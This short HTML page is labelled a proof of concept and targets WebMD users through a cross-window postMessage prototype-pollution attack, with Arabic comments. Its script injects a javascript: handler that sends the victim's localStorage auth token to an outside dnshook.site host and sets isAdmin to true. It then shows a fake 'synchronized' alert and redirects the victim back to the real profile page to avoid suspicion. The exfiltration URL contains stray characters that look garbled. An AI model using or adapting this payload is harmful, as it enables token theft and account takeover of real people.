<!DOCTYPE html>
<html>
<body>
<h3>PoC – Post‑Login Redirect Confirmation</h3>
<pre id="out"></pre>

<script>
    // الوصول إلى النافذة التي قامت بالتوجيه (التي لا تزال على WebMD)
    if (window.opener) {
        // إرسال السم للنافذة الأصلية
        window.opener.postMessage({
            type: "set-config",
            data: {
                "__proto__": {
                    // حقن كود لسرقة التوكنات فوراً
                    "tokenHandler": "javascript:fetch('اhttps://webmd.comز6400a8d9-6bff-4da3-9540-9ebf5bdcdfa0.dnshook.site/log?token='+localStorage.getItem('auth'))",
                    "isAdmin": true
                }
            }
        }, "*");
        
        alert("Account Information Synchronized!");
        // إعادة توجيه الضحية مرة أخرى للموقع الأصلي لعدم إثارة الشكوك
        window.location.href = "https://member.webmd.com/profile";
    }
</script>
</body>
</html>
